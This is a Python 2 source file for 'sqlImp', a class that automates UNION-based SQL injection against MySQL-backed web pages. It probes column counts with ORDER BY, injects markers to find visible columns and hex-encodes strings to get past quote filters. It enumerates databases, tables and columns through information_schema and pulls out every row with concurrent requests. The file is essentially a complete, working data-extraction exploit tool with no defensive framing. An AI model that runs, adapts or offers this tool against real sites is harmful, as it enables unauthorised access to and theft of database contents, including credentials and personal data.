#!/usr/bin/python
# -*- coding: utf-8 -*-

__version__ = '1.0'
__author__ = 'Javier Rascón Mesa'

# '+' simbol is always put at the beggining of the string
# Not initialized unnecessary attributes won't be asked (eg. self.qry_begg)

import urllib
import threading
from time import sleep

class sqlImp:
	
	# Verbosity level showing URLs
	show_urls = 0

	# Quote filtering activated on the page
	quote_filter_active = False

	# Number of columns in the query
	num_col_select = 0

	# SELECT column which show the query result
	visible_col = 0
	
	# Vulnerable page URL
	page_url = ''
	
	# URL part to the left of the inyection
	url_begg = ''
	
	# URL part to the right of the inyection
	url_end = ''
	
	# SELECT string to the left of the visible column
	select_left_part = ''
	
	# SELECT string to the right of the visible column
	select_right_part = ''
	
	# String to the left of the query to be able to insert it
	qry_begg = ''

	# String to the right of the query to be able to insert it
	qry_ending = ''
	
	# Vulnerable variable
	vuln_var = ''
	
	# String that appears before the query result
	prev_str=''
	
	# String that appears after the query result
	post_str=''
	
	def __init__(self,page_url='',vuln_var='',num_col_select=0,visible_col=0,qry_begg='',qry_ending='-- -'):
		"""
		Constructor

		Params:
			page_url (str): Vulnerable URL (parameters included)
			vuln_var (str): Vulnerable variable
			num_col_select (int): Number of columns of the query
			visible_col (int): Column number which show que query result
			qry_begg (str): Query beggining
			qry_ending (str): Query ending
		"""
		
		## page_url
		if not page_url:
			self.page_url = raw_input("URL: ")
		else:
			self.page_url = page_url

		## vuln_var
		
		# get vars & list them
		url_vars  = self.get_url_params()
		
		if len(url_vars) == 1 :
			self.vuln_var = url_vars[0]
		else:
			if not vuln_var:
				for i in range(len(url_vars)):
					print i,url_vars[i]
				
				print
				self.vuln_var = url_vars[int(raw_input("Vulnerable variable:"))]
			else:
				self.vuln_var = vuln_var
			
			# Check if the introduced variable is included in url_vars 
			if self.vuln_var not in url_vars:
				print "Introduced variable not found in URL"
				
				for i in range(len(url_vars)):
					print i,url_vars[i]
				
				print
				self.vuln_var = url_vars[int(raw_input("Vulnerable variable:"))]
			
		# qry_begg
		if not qry_begg:
			#self.qry_begg = raw_input("SQL query beggining: ")
			self.qry_begg = qry_begg
		else:
			self.qry_begg = qry_begg

		# qry_ending
		if not qry_ending:
			#self.qry_ending = raw_input("SQL query ending: ")
			self.qry_ending = qry_ending
		else:
			self.qry_ending = qry_ending
		
		# num_col_select
		if num_col_select:
			self.num_col_select = num_col_select
		
		# columna visible
		if visible_col:
			self.visible_col = visible_col
		
		self.split_url()
		

	def start(self):
		"""Start of processing and data collection after setting the filter 
		parameters such as the quote filter, as the nedd to connect to server
		
		- Find out the number of columns in the query
		- Find out visible columns
		- Look for previous and posterior strings
		"""
		print "Starting..."
		
		# --> Number of columns en the SELECT <-- #
		
		if not self.num_col_select:
			print "Finding out the number of columns in the query...",
			
			self.num_col_select = self.guess_num_cols()
			
			print self.num_col_select
		
		# --> Finding out visible columns <-- #
		
		if not self.visible_col:
		
			print "Finding out visible columns...",
		
			visibles = self.guess_visible_cols()
			
			if not visibles:
				print " --> No visible columns found"
				print " --> The execution cannot continue"
				exit()
			
			print visibles.keys()

			unique = False # has been found a variable that only appears once?

			for i in visibles:
				if visibles[i] == 1:
					self.visible_col = i
					unique = True
					break

			if not unique: # all variables appear more than once
				self.visible_col = raw_input("There was no culumn found with a single occurence\nColumn for inyection:")

			print "Visible column selected:",i
		
		self.gen_url_parts()
		
		# --> Look for previous and posterior strings <-- #
		
		print "Looking for strings...",
		if not self.guess_strings():
			print "FAILLO"
			print " --> start(): Error while looking for previous and posterior strings"
			print " --> The execution cannot continue"
			exit()
		else:
			print "OK"
			print "Found strings:"
			print "Previous:",self.prev_str
			print "Posterior:",self.post_str

		print "Enjoy sqlImp!"
		

	def visit(self,columns='',table='',database='',conditions='',separator='',order=0,limit=0):
		"""
		Makes a request of the page

		Params:
			columns (list<str>): List of columns you want to see
			table (str):
			database (str):
			conditions (str):
			separator (str):
			order (int):
			limit (int):

		Return:
			(str): Resulting page
		"""
		# --> Inyection and attack string generation <-- #

			# get table size
		try:

			inyect=''
			
			# obtain tuples from table

			if columns:
				num_cols2concat = len(columns)

				if num_cols2concat == 1: # only one
					col_name = columns[0].strip()
				else: # several columns
					sep_str = ','

					# separator string generation
					for i in separator:
						sep_str += str(hex(ord(i)))+','

					col_name = 'concat('

					for i in columns[:-1]:
						col_name += i.strip() + sep_str

					col_name += columns[-1].strip() + ')'

				inyect+='+and+1=0+union+select+distinct'

				inyect += self.select_left_part +col_name + self.select_right_part

			if table:
				inyect+='+from+'

				if database:
					inyect+=database+'.'

				inyect+=table
			#else:
			#	inyect+='+from+dual'

			if conditions:
				inyect += '+where+'+conditions

			if order:
				inyect += '+order+by+'+str(order)


			#if type(limit)==type(1):
			inyect += '+limit+'+str(limit)+',1'

			url = self.url_begg + inyect + self.url_end
			
			if self.show_urls >= 2:
				print " ==> Original URL:",url

			if(self.quote_filter_active):
				url=self.bypass_quote_filter(url)
				#if self.show_urls:
				#	print " ==> Bypassed:",url

			#url = urllib.quote(url)
			url = url.replace(' ','+')
			if self.show_urls >= 1:
				print " ==> Final URL:",url

			page = urllib.urlopen(url).read()

			return page

		except (NameError, ValueError):
			print '--> Exception caught:',NameError,':',ValueError
			exit()
	
	
	def split_url(self):
		"""
		Method to split the URL into two parts to contatenate in the middle the
		inyection code
		"""
		
		## Generate URL left part to the left of the inyection

		# split part wich not contains the parameters
		(self.url_begg,aux_url) = self.page_url.split('?',1) # switch for lfind and [:]?
		self.url_begg += '?'

		# look for vulnerable variable '=' position
		eq_pos = aux_url.find(self.vuln_var+'=')+len(self.vuln_var)+1 # hasta la variable + variable + '='

		# concatenate variable name
		self.url_begg += aux_url[:eq_pos]
		aux_url = aux_url[eq_pos:]

		## Generate URL right part to the left of the inyection
		if(aux_url.find('&') != -1): # remaining parameters?
			self.url_begg += aux_url[:aux_url.find('&')]
			self.url_end = aux_url[aux_url.find('&'):]
		
		else:
			self.url_begg += aux_url
			self.url_end = ''
			
		self.url_begg += self.qry_begg
		self.url_end = self.qry_ending + self.url_end
		
	
	def gen_url_parts(self):
		"""
		Method to generate URL parts to the left and right of the inyection
		"""
		
		self.split_url()
		
		self.select_left_part = '+'
		self.select_right_part = ''

		for i in range(1,self.num_col_select+1):

			if i < self.visible_col:
				self.select_left_part += str(i)+','
			elif i > self.visible_col:
				self.select_right_part += ','+str(i)

	
	def table_num_rows(self,columns,table,database,conditions):
		"""
		Get the number of rows of the query
		
		Turn the string of columns into a list of columns

		Params:
			columns ():
			table ():
			database ():
			conditions ():

		Return:
			(int): Number of rows
		"""
		try:
			if columns=='*':
				columns=self.get_asterisk(table)

			columns_aux = 'count(distinct+'

			for i in columns:
				columns_aux += i+','

			columns = [columns_aux[:-1]+')']

			if '.' in table:
				(database,table) = table.split('.')

			page = self.visit(columns,table,database,conditions)

			return int(self.clear(page,self.prev_str,self.post_str))

		except ValueError:
			print " --> table_num_rows( self , columns , table , database , conditions)"
			print " --> Excepcion caught: ValueError"
			print " --> return value",self.clear(page,self.prev_str,self.post_str)

			fd_err = open('err_page.html','w')
			fd_err.write(page)
			fd_err.close()
			print " --> Page dumped in file 'err_page.html'"
		except (NameError, ValueError):
			print NameError,':',ValueError

	def get_table(self,columns='',table='',database='',conditions='',separator=''):
		"""
		Gets a table with the indicated columns and conditions

		Params:
			columns (str): columns to obtain. The string can be '*' or columns 
							sepparated by commas ','
			table (str): table where to get the columns
			database (str): Database where the table is present.
							Needed if '*' is used and there is more databases 
							with a table with the same name
			conditions (str): query conditions (appear after 'WHERE')
			separator (str): string that separates the different columns 
							obtained

		Return:
			(list<str>): Strings list, each string represents a row
		"""
		try:

			if not table:
				table = raw_input("Table name: ")

			if not columns:
				columns = raw_input("Columns (* o sepparated by commas): ")

			if columns!='*':
				columns = columns.split(',')
			else:
				columns = self.get_asterisk(table)
			
			# columns are already coded as a list

			if not conditions:
				conditions = raw_input("Conditions (without WHERE): ")

			if not separator and len(columns)>1:
				separator = raw_input("Separator: ")


			# obtain table size
			num_rows = self.table_num_rows(columns,table,database,conditions)

			if(not num_rows):
				warn ="Table "+table+" does not contain any row"
				if(conditions):
					warn+=" with the conditions "+conditions

				print warn

			self.output=[]

			# tuple by tuple requests
			
			for i in range(num_rows):

				limit = i

				threading.Thread(target=self.__get_table_thread,args=(columns,table,database,conditions,separator,limit)).start()

			while len(self.output)<num_rows:
				sleep(0.01)

		except (NameError, ValueError):
			print NameError,':',ValueError
	
		finally:
			return self.output

	def __get_table_thread(self,columns,table,database,conditions,separator,limit):
		"""
		Method to be executed at self.get_table to make concurrent requests
		"""
		try:
			output = '-'

			page = self.visit(columns,table,database,conditions,separator,limit=limit)
			output = self.clear(page,self.prev_str,self.post_str)

		except (NameError, ValueError):
			print NameError,':',ValueError
		finally:
			self.output.append(output)

	def list_dbs(self):
		"""
		Lists databases

		System db not shown:
			information_schema
			mysql
		"""

		conditions = "table_schema != 'information_schema' and table_schema != 'mysql'"

		return self.get_table(table='information_schema.TABLES',columns='table_schema',conditions=conditions)

	def list_tables(self,database=''):
		"""
		Lists tables at given database

		Params:
			database (str): Database to scan

		Return:
			(list): List of tables in the database
		"""

		if not database:
			
			dbs = self.list_dbs()
			
			
			# get databases from 'list_dbs' function
			database = raw_input('Database: ')
		
		return self.get_table(columns='TABLE_NAME',table='information_schema.TABLES',conditions='TABLE_SCHEMA = \''+database+'\'')

	def list_table_columns(self,table=''):
		"""
		Method to get the column names of a given table
		
		Params:
			table (str): Table to analyse
			
		Return:
			(list): List of string with the name of the columns in the table
		"""

		if not table:
			table =  raw_input('table: ')

		conditions = 'table_name = \''+table+'\''

		if '.' in table:
			(esquema,table)=table.split('.')
			conditions = 'TABLE_NAME=\''+table+'\' AND TABLE_SCHEMA=\''+esquema+'\''

		columns = self.get_table(columns='column_name',table='information_schema.columns',conditions=conditions)

		return columns
		

	def clear(self,page,prev_str,post_str):
		"""
		Extracts the inyection results from the given page
		
		Params:
			page (str): Page from wich to extract the query result
			prev_str (str): String that appears before the query result
			post_str (str): String that appears after the query result
		
		Return:
			(str): Query result
		"""
		return page.split(prev_str)[1].split(post_str)[0]

	def bypass_quote_filter(self,url):
		"""
		Modifies the given URL to bypass quote filters in the server
		
		Params:
			url (str): URL to modify
			
		Return:
			(str): URL modified to bypass quote filters
		"""

		url=url.split("'")
		ret_url=""

		for i in range(len(url)):
			if(not i % 2): # if is even
				ret_url += url[i]
			else:
				ret_url += self.mysql_ascii2hex(url[i])

		return ret_url

	def guess_strings(self):
		"""
		Tries out previous and postrerior strings
		
		Return:
			(bool): 'True'' if the strings have been found, 'False' otherwise
		"""
		# [0x20 --> 0x7E]

		if self.prev_str and self.post_str:
			return True

		marker = "'@@$$'"

		# make a query with the marker

		resp = self.visit(columns=[marker])
		marker = marker[1: -1]
		
		# look for the marker

		if not marker in resp:
			print " --> guess_strings: Marker not found"
			return False

		partition = resp.split(marker)

		if len(partition) == 2: # if the marker appears once
			(prev, post) = partition
		else:
			print "Several markers found:"

			for i in range(len(partition) - 1):
				print '(' + str(i) + ')'
				print '--> Previous:', partition[i][-10:]
				print '--> Posterior:', partition[i + 1][: 10]

			str_num = int(raw_input("String pair:"))
			prev = partition[str_num]
			post = partition[str_num + 1]

		# check the number of occurences

		# prev
		if not self.prev_str:
			num_chars=2
			len_prev = len(prev)

			while(prev.count(prev[-num_chars: ]) > 1) and \
				(num_chars <= len_prev):
				
				num_chars += 1

			self.prev_str = prev[-num_chars: ]

		# post
		if not self.post_str:
			num_chars=2
			len_post = len(post)

			while(post.count(post[:num_chars]) > 1) and \
				(num_chars <= len_post):
				
				num_chars+=1

			self.post_str = post[:num_chars]

		return True

	def get_asterisk(self,table):
		"""
		Gets the column names of the table
		
		Params:
			table (str): Name of the table
		
		Return:
			(list): List with strings with te names of the columns
		"""

		columns=[]
		for i in self.list_table_columns(table):
			columns.append(i)

		return columns

	def guess_num_cols(self):
		"""
		Averigua el número de columns de la sentencia SELECT
		Tries to guess the number of columns in the SELCT sentence

		Return:
			(int): number of columns in the SELECT sentence

		"""

		diff = False

		prev_page = self.visit(order=1)

		index = 2

		while not diff:

			post_page = self.visit(order=index)

			if prev_page != post_page: # if the page returns an error
			
				# if the two following pages returns error
				if post_page == self.visit(order=index + 1):
					return index - 1
				else:
					return 0

			index += 1

	def guess_visible_cols(self):
		"""
		Tries to guess the visible columns

		Return:
			(dict(int:int)): Dictionary containing pairs 'column index' : 
							'number of appearances'. Index starts at 1
		"""

		num_cols = self.num_col_select
		visibles = {}

		for i in range(1, num_cols + 1):

			marker = "'@@$$'"
			
			self.visible_col = i
			
			self.gen_url_parts()
			
			page = self.visit(columns=[marker])
			marker = marker[1: -1]

			if page.count(marker) > 0:
				visibles[i] = page.count(marker)

		return visibles

	def get_url_params(self,url=''):
		"""
		Gets the URL parameters
		
		Return:
			(list(str): List of strings with the name of the URL parameters
		"""
		
		if not url:
			url = self.page_url
		
		params = url.split('?')[1]
		params = params.split('&')
		
		for i in range(len(params)):
			params[i] = params[i].split('=')[0]
			
		return params
			
	def mysql_ascii2hex(self, txt):

		output = "0x"

		for i in txt:
			output += hex(ord(i))[2: 4]

		return output

